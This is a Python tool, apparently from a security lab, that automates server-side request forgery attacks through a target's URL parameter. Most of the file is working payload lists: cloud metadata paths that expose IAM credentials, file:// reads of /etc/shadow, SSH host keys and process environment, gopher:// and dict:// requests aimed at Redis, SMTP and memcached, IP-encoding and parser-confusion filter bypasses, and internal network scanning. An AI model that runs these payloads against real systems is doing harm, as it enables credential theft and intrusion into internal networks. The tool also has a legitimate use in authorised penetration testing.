#!/usr/bin/env python3
"""
SSRF Exploitation & Security Validation Tool
Author: Security Research Lab
Description: Comprehensive SSRF testing tool for vulnerability assessment and security validation
"""

import requests
import json
import time
import sys
import argparse
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress

class SSRExploiter:
    def __init__(self, target_url, output_file=None):
        self.target_url = target_url.rstrip('/')
        self.output_file = output_file
        self.results = []
        self.vulnerabilities_found = []
        
        # Request session with common headers
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (SSRF-Test-Scanner)',
            'Accept': '*/*',
            'Connection': 'close'
        })
        
    def log(self, message, level="INFO"):
        """Log messages with timestamps"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        print(log_entry)
        
        if self.output_file:
            with open(self.output_file, 'a', encoding='utf-8') as f:
                f.write(log_entry + '\n')
    
    def test_endpoint(self, test_url, description=""):
        """Test a single URL and return results"""
        try:
            full_url = f"{self.target_url}?url={quote(test_url)}"
            
            response = self.session.get(
                full_url, 
                timeout=10,
                allow_redirects=False,
                verify=False
            )
            
            result = {
                'description': description,
                'test_url': test_url,
                'target_url': full_url,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.content),
                'vulnerable': False,
                'evidence': ""
            }
            
            # Analyze response for success indicators
            if response.status_code == 200:
                content = response.text.lower()
                
                # Check for common success indicators
                success_indicators = [
                    'admin', 'dashboard', 'password', 'secret', 'api',
                    'instance', 'metadata', 'ami-id', 'local-ipv4',
                    'redis', 'mysql', 'ssh', 'root:', 'etc/passwd'
                ]
                
                for indicator in success_indicators:
                    if indicator in content:
                        result['vulnerable'] = True
                        result['evidence'] = f"Found '{indicator}' in response"
                        break
                
                # Check for specific protocol responses
                if test_url.startswith('file://') and len(response.content) > 0:
                    result['vulnerable'] = True
                    result['evidence'] = "File protocol access successful"
                
                if 'redis' in content or 'connected_clients' in content:
                    result['vulnerable'] = True
                    result['evidence'] = "Redis service accessed"
            
            return result
            
        except requests.exceptions.Timeout:
            return {
                'description': description,
                'test_url': test_url,
                'error': 'Timeout',
                'vulnerable': False
            }
        except requests.exceptions.ConnectionError:
            return {
                'description': description,
                'test_url': test_url,
                'error': 'Connection failed',
                'vulnerable': False
            }
        except Exception as e:
            return {
                'description': description,
                'test_url': test_url,
                'error': str(e),
                'vulnerable': False
            }
    
    def internal_service_enumeration(self):
        """Test internal service enumeration"""
        self.log("Starting internal service enumeration...")
        
        test_cases = []
        
        # Localhost variations
        localhost_targets = [
            'http://localhost/',
            'http://127.0.0.1/',
            'http://0.0.0.0/',
            'http://[::1]/',
            'http://127.0.0.1:80/',
            'http://localhost:8080/',
            'http://127.1/',
            'http://127.0.1/',
        ]
        
        for target in localhost_targets:
            test_cases.append((target, f"Localhost access: {target}"))
        
        # Common internal services
        common_services = [
            ('http://192.168.1.1/', 'Router admin interface'),
            ('http://10.0.0.1/', 'Internal network gateway'),
            ('http://172.16.0.1/', 'Corporate network'),
            ('http://169.254.169.254/', 'AWS Metadata service'),
            ('http://metadata.google.internal/', 'GCP Metadata service'),
            ('http://100.100.100.200/', 'Alibaba Cloud metadata'),
            ('http://192.168.0.1/', 'Common router IP'),
            ('http://10.1.1.1/', 'Internal network'),
        ]
        
        for target, description in common_services:
            test_cases.append((target, description))
        
        # Common application ports
        ports = [80, 443, 8080, 8000, 3000, 5000, 9000]
        for port in ports:
            test_cases.append((f'http://127.0.0.1:{port}/', f'Local port {port}'))
            test_cases.append((f'http://localhost:{port}/', f'Localhost port {port}'))
        
        # Test all cases
        self._run_test_suite(test_cases, "Internal Service Enumeration")
    
    def cloud_metadata_access(self):
        """Test cloud metadata service access"""
        self.log("Testing cloud metadata service access...")
        
        test_cases = []
        
        # AWS EC2 Metadata Service
        aws_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
            'http://169.254.169.254/latest/meta-data/public-keys/',
            'http://169.254.169.254/latest/meta-data/ami-id',
            'http://169.254.169.254/latest/meta-data/hostname',
        ]
        
        for endpoint in aws_endpoints:
            test_cases.append((endpoint, f"AWS Metadata: {endpoint}"))
        
        # Google Cloud Platform
        gcp_endpoints = [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/project/',
        ]
        
        for endpoint in gcp_endpoints:
            test_cases.append((endpoint, f"GCP Metadata: {endpoint}"))
        
        # Azure
        azure_endpoints = [
            'http://169.254.169.254/metadata/instance',
            'http://169.254.169.254/metadata/attested/document',
        ]
        
        for endpoint in azure_endpoints:
            test_cases.append((endpoint, f"Azure Metadata: {endpoint}"))
        
        # DigitalOcean
        do_endpoints = [
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/v1/id',
            'http://169.254.169.254/metadata/v1/user-data',
        ]
        
        for endpoint in do_endpoints:
            test_cases.append((endpoint, f"DigitalOcean Metadata: {endpoint}"))
        
        # Test all cases
        self._run_test_suite(test_cases, "Cloud Metadata Access")
    
    def protocol_based_attacks(self):
        """Test dangerous protocol attacks"""
        self.log("Testing dangerous protocol attacks...")
        
        test_cases = []
        
        # file:// protocol attacks
        file_targets = [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///etc/shadow',
            'file:///proc/self/environ',
            'file:///etc/ssh/ssh_host_rsa_key',
            'file:///c:/windows/system32/drivers/etc/hosts',
            'file:///c:/windows/win.ini',
            'file:///c:/boot.ini',
            'file://test_file.txt',
            'file://../config.py',
            'file://./app.py',
        ]
        
        for target in file_targets:
            test_cases.append((target, f"File protocol: {target}"))
        
        # gopher:// protocol attacks
        gopher_targets = [
            'gopher://127.0.0.1:6379/_INFO',
            'gopher://localhost:6379/_KEYS%20*',
            'gopher://127.0.0.1:25/_HELO%20localhost',
            'gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com',
            'gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0',
        ]
        
        for target in gopher_targets:
            test_cases.append((target, f"Gopher protocol: {target}"))
        
        # data:// protocol attacks
        data_targets = [
            'data:text/plain,SSRF%20Test%20Data',
            'data:text/html,<h1>SSRF%20Test</h1>',
            'data:text/html,<script>alert("XSS")</script>',
            'data:application/x-php,<?php%20phpinfo();%20?>',
            'data:text/css,body{background:red}',
        ]
        
        for target in data_targets:
            test_cases.append((target, f"Data URI: {target}"))
        
        # dict:// protocol attacks
        dict_targets = [
            'dict://127.0.0.1:11211/stats',
            'dict://localhost:6379/info',
            'dict://192.168.1.1:80/',
        ]
        
        for target in dict_targets:
            test_cases.append((target, f"Dict protocol: {target}"))
        
        # phar:// protocol attacks
        phar_targets = [
            'phar:///etc/passwd',
            'phar://test_file.txt',
            'phar://./app.py',
        ]
        
        for target in phar_targets:
            test_cases.append((target, f"Phar protocol: {target}"))
        
        # Test all cases
        self._run_test_suite(test_cases, "Protocol-Based Attacks")
    
    def bypass_techniques(self):
        """Test SSRF bypass techniques"""
        self.log("Testing SSRF bypass techniques...")
        
        test_cases = []
        
        # IP encoding bypasses
        ip_variations = [
            # Decimal
            'http://2130706433/',
            'http://3232235521/',
            'http://16843009/',
            
            # Octal
            'http://0177.0.0.1/',
            'http://0177.0000.0000.0001/',
            'http://0x7f.0.0.1/',
            
            # Hexadecimal
            'http://0x7f000001/',
            'http://0xc0a80001/',
            'http://0x7f.0x0.0x0.0x1/',
            
            # Mixed
            'http://0x7f.1/',
            'http://127.1/',
            'http://127.0.1/',
        ]
        
        for target in ip_variations:
            test_cases.append((target, f"IP encoding: {target}"))
        
        # DNS rebinding and tricks
        dns_tricks = [
            #'http://127.0.0.1.nip.io/',
            'http://localhost.localdomain/',
            'http://subdomain.localhost/',
            'http://localtest.me/',
            'http://lvh.me/',
            'http://127.0.0.1.nip.io',
            #'http://vcap.me/',
        ]
        
        for target in dns_tricks:
            test_cases.append((target, f"DNS trick: {target}"))
        
        # URL parser confusion
        parser_confusion = [
            #'http://127.0.0.1@evil.com/',
            'http://evil.com@127.0.0.1/',
            'http://127.0.0.1#@evil.com/',
            'http://127.0.0.1?@evil.com/',
            'http://[::]:80/',
            'http://[::ffff:127.0.0.1]/',
        ]
        
        for target in parser_confusion:
            test_cases.append((target, f"Parser confusion: {target}"))
        
        # Case variations
        case_variations = [
            'http://LOCALHOST/',
            'http://LocalHost/',
            'http://127.0.0.1:80/../',
            'http://127.0.0.1:80/..;/',
        ]
        
        for target in case_variations:
            test_cases.append((target, f"Case variation: {target}"))
        
        # Test all cases
        self._run_test_suite(test_cases, "Bypass Techniques")
    
    def security_control_validation(self):
        """Validate security controls"""
        self.log("Validating security controls...")
        
        test_cases = []
        
        # Allowed URLs (should work)
        allowed_urls = [
            ('https://httpbin.org/json', 'Allowed external URL'),
            ('https://jsonplaceholder.typicode.com/posts/1', 'Allowed API endpoint'),
            ('https://httpbin.org/ip', 'Allowed HTTPS URL'),
        ]
        
        for target, description in allowed_urls:
            test_cases.append((target, description))
        
        # Blocked protocols (should be blocked)
        blocked_protocols = [
            ('file:///etc/passwd', 'File protocol blocking'),
            ('gopher://127.0.0.1:6379', 'Gopher protocol blocking'),
            ('phar:///test.phar', 'Phar protocol blocking'),
            ('data:text/html,<script>', 'Data URI blocking'),
            ('dict://127.0.0.1:11211', 'Dict protocol blocking'),
            ('ftp://example.com/file', 'FTP protocol blocking'),
        ]
        
        for target, description in blocked_protocols:
            test_cases.append((target, description))
        
        # Private IP blocking (should be blocked)
        private_ips = [
            ('http://127.0.0.1/admin', 'Localhost blocking'),
            ('http://localhost/', 'Localhost hostname blocking'),
            ('http://192.168.1.1/', 'RFC 1918 blocking'),
            ('http://10.0.0.1/', 'Private class A blocking'),
            ('http://172.16.0.1/', 'Private class B blocking'),
            ('http://169.254.169.254/', 'Link-local blocking'),
            ('http://0.0.0.0/', 'All zeros blocking'),
        ]
        
        for target, description in private_ips:
            test_cases.append((target, description))
        
        # Test all cases
        self._run_test_suite(test_cases, "Security Control Validation")
    
    def _run_test_suite(self, test_cases, suite_name):
        """Run a suite of tests with threading"""
        self.log(f"Running {suite_name} - {len(test_cases)} test cases...")
        
        suite_results = []
        vulnerable_count = 0
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_test = {
                executor.submit(self.test_endpoint, url, desc): (url, desc) 
                for url, desc in test_cases
            }
            
            for future in as_completed(future_to_test):
                url, desc = future_to_test[future]
                try:
                    result = future.result()
                    suite_results.append(result)
                    
                    if result.get('vulnerable'):
                        vulnerable_count += 1
                        self.log(f"ðŸš¨ VULNERABILITY FOUND: {desc}", "CRITICAL")
                        self.log(f"    URL: {result['test_url']}", "CRITICAL")
                        self.log(f"    Evidence: {result.get('evidence', 'N/A')}", "CRITICAL")
                        self.vulnerabilities_found.append(result)
                    elif result.get('error'):
                        self.log(f"âŒ Error: {desc} - {result['error']}", "ERROR")
                    else:
                        self.log(f"âœ… Tested: {desc} - Status: {result.get('status_code', 'N/A')}", "INFO")
                        
                except Exception as e:
                    self.log(f"âŒ Exception testing {desc}: {str(e)}", "ERROR")
        
        # Add suite summary to results
        suite_summary = {
            'suite_name': suite_name,
            'total_tests': len(test_cases),
            'vulnerable_tests': vulnerable_count,
            'results': suite_results
        }
        self.results.append(suite_summary)
        
        self.log(f"Completed {suite_name}: {vulnerable_count}/{len(test_cases)} vulnerabilities found")
    
    def network_scanning(self):
        """Perform internal network scanning"""
        self.log("Starting internal network scanning...")
        
        # Common internal network ranges
        networks = [
            '192.168.1.{}',    # Common home network
            '192.168.0.{}',    # Common home network
            '10.0.0.{}',       # Corporate network
            '172.16.0.{}',     # Corporate network
            '172.17.0.{}',     # Docker default
        ]
        
        ports = [80, 443, 8080, 8000]
        
        scan_results = []
        
        for network_template in networks[:2]:  # Limit for demo
            for i in range(1, 5):  # Scan first few IPs
                ip = network_template.format(i)
                for port in ports[:2]:  # Scan common ports
                    target = f"http://{ip}:{port}/"
                    result = self.test_endpoint(target, f"Network scan: {target}")
                    scan_results.append(result)
                    
                    if result.get('status_code') == 200:
                        self.log(f"ðŸŒ SERVICE FOUND: {target}", "SUCCESS")
        
        self.results.append({
            'suite_name': 'Network Scanning',
            'results': scan_results
        })
    
    def generate_report(self):
        """Generate comprehensive test report"""
        self.log("Generating comprehensive report...")
        
        total_vulnerabilities = len(self.vulnerabilities_found)
        total_tests = sum(suite['total_tests'] for suite in self.results)
        
        report = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_time': time.strftime("%Y-%m-%d %H:%M:%S"),
                'total_tests': total_tests,
                'total_vulnerabilities': total_vulnerabilities,
                'risk_level': self._calculate_risk_level(total_vulnerabilities)
            },
            'vulnerabilities': self.vulnerabilities_found,
            'detailed_results': self.results
        }
        
        # Print summary
        print("\n" + "="*80)
        print("ðŸŽ¯ SSRF EXPLOITATION REPORT")
        print("="*80)
        print(f"Target: {self.target_url}")
        print(f"Total Tests: {total_tests}")
        print(f"Vulnerabilities Found: {total_vulnerabilities}")
        print(f"Risk Level: {report['scan_info']['risk_level']}")
        
        if total_vulnerabilities > 0:
            print("\nðŸš¨ CRITICAL VULNERABILITIES FOUND:")
            for vuln in self.vulnerabilities_found:
                print(f"  â€¢ {vuln['description']}")
                print(f"    URL: {vuln['test_url']}")
                print(f"    Evidence: {vuln.get('evidence', 'N/A')}")
                print()
        
        # Save report to file
        if self.output_file:
            with open(self.output_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            self.log(f"Full report saved to: {self.output_file}")
        
        return report
    
    def _calculate_risk_level(self, vulnerability_count):
        """Calculate overall risk level"""
        if vulnerability_count == 0:
            return "LOW"
        elif vulnerability_count <= 3:
            return "MEDIUM"
        elif vulnerability_count <= 10:
            return "HIGH"
        else:
            return "CRITICAL"
    
    def run_comprehensive_test(self):
        """Run all test suites"""
        self.log(f"Starting comprehensive SSRF exploitation test against: {self.target_url}")
        
        start_time = time.time()
        
        # Run all test suites
        test_suites = [
            self.internal_service_enumeration,
            self.cloud_metadata_access,
            self.protocol_based_attacks,
            self.bypass_techniques,
            self.security_control_validation,
            self.network_scanning,
        ]
        
        for suite in test_suites:
            try:
                suite()
                time.sleep(1)  # Be nice to the target
            except Exception as e:
                self.log(f"Error running {suite.__name__}: {str(e)}", "ERROR")
        
        # Generate report
        report = self.generate_report()
        
        elapsed_time = time.time() - start_time
        self.log(f"Comprehensive test completed in {elapsed_time:.2f} seconds")
        
        return report

def main():
    parser = argparse.ArgumentParser(description='SSRF Exploitation & Security Validation Tool')
    parser.add_argument('target', help='Target URL (e.g., http://localhost:5000/vulnerable-proxy)')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('--suite', choices=['all', 'internal', 'cloud', 'protocols', 'bypass', 'security', 'network'],
                       default='all', help='Test suite to run')
    
    args = parser.parse_args()
    
    exploiter = SSRExploiter(args.target, args.output)
    
    try:
        if args.suite == 'all':
            report = exploiter.run_comprehensive_test()
        else:
            # Run specific suite
            if args.suite == 'internal':
                exploiter.internal_service_enumeration()
            elif args.suite == 'cloud':
                exploiter.cloud_metadata_access()
            elif args.suite == 'protocols':
                exploiter.protocol_based_attacks()
            elif args.suite == 'bypass':
                exploiter.bypass_techniques()
            elif args.suite == 'security':
                exploiter.security_control_validation()
            elif args.suite == 'network':
                exploiter.network_scanning()
            
            report = exploiter.generate_report()
        
        # Exit code based on findings
        if report['scan_info']['total_vulnerabilities'] > 0:
            sys.exit(1)  # Vulnerabilities found
        else:
            sys.exit(0)  # No vulnerabilities found
            
    except KeyboardInterrupt:
        exploiter.log("Scan interrupted by user", "WARNING")
        sys.exit(130)
    except Exception as e:
        exploiter.log(f"Unexpected error: {str(e)}", "ERROR")
        sys.exit(1)

if __name__ == '__main__':
    main()